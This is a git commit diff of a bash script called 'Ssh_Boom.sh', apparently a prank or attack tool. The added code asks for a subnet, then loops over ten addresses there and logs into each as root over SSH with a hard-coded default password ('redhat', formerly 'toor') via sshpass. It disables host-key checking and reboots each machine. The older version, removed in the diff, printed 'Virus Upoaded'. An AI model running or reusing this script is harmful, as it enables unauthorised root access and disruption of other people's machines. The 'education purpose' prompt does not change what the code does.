2325806a1f83c0ef793cf04c80c50bb7e01f2385
Reverse_Shell <36511525+CrackTheHack@users.noreply.github.com>
2021-03-04 13:14:17 +0530

    ssh_bomd.sh

--- Ssh_Boom.sh
+++ Ssh_Boom.sh
@@ -1,38 +1,48 @@
 #!/bin/bash
+#Author: Utkarsh Singh
+#Version: 2.0
 
 echo ""
 echo -e " 		      #\033[1;31m ##################################################\033[0m"
-echo -e " 		      # \033[1;37mFollow me on Insta : utkarsh_singh_thakur\033[0m"
+echo -e " 		      # \033[1;37mFollow me on Insta : utkarsh_.singh.__\033[0m"
 echo -e " 		      # \033[1;37mAuthor : Utkarsh_Singh\033[0m"
 echo -e " 		      # \033[1;31m###********************\033[0m"
 echo -e " 		      # \033[6m*****\033[1;34m SSH_BOOM \033[0m\033[6m*****\033[0m"
 echo -e " 		      # \033[1;31m#######\033[0m"
 echo -e " 		      # \033[1;31m##\033[0m"
-read -p " Lets Do This [Y/N] : " ync
+read -p " Only For Education Purpose? [Y/N] : " ync
 while true ; do
 
-case $ync in 
+case $ync in
 
 	[Yy]* )
-	 ssh-keygen -f "/root/.ssh/known_hosts" -R "192.168.43.211"
-	  echo ""
-	   echo -e " 			\033[7m Setup Done* \033[0m"
-	    sleep 1
-	     echo ""
-	      sshpass -p 'toor' ssh -o StrictHostKeyChecking=no root@192.168.43.211 'reboot'
+
+echo ""
+echo "|###########################################|"
+echo "| Example: 192.168.?.0/24		    |"
+echo "|-------------------------------------------|"
+printf "| Enter 3 octet: "
+read -r "a"
+echo "|###########################################|"
+echo "| You're Target Network is: 192.168.$a.0/24 |"
+echo "|-------------------------------------------|"
+echo "| 	Press Crtl+C To Continue	    |"
+echo "| ##########################################|"
+echo ""
+for b in $(seq 1 10)
+do
+	ssh-keygen -f "/root/.ssh/known_hosts" -R 192.168.$a.$b
+	sshpass -p 'redhat' ssh -o StrictHostKeyChecking=no root@192.168.$a.$b 'reboot'
 	echo ""
-	 echo -e "			\033[7m Setup Done* \033[0m"
-	  sleep 1
-	   echo""
-	    ssh-keygen -f "/root/.ssh/known_hosts" -R "192.168.43.219"
-	     sshpass -p 'toor' ssh -o StrictHostKeyChecking=no root@192.168.43.219 'reboot'
-	      sleep 2
-	echo""
-	 echo -e " 		      \033[7mVirus Upoaded..!!\033[0m"
-	  echo ""
-	   exit;;
-	    [Nn]* ) 
-              exit;;
-	        [Cc]* ) exit;;
-      		  esac
-    		   done
+	echo "|##########################################################|"
+	echo ""
+	((b++))
+done
+echo ""
+exit;;
+[Nn]* )
+exit;;
+[Cc]* )
+exit;;
+esac
+done
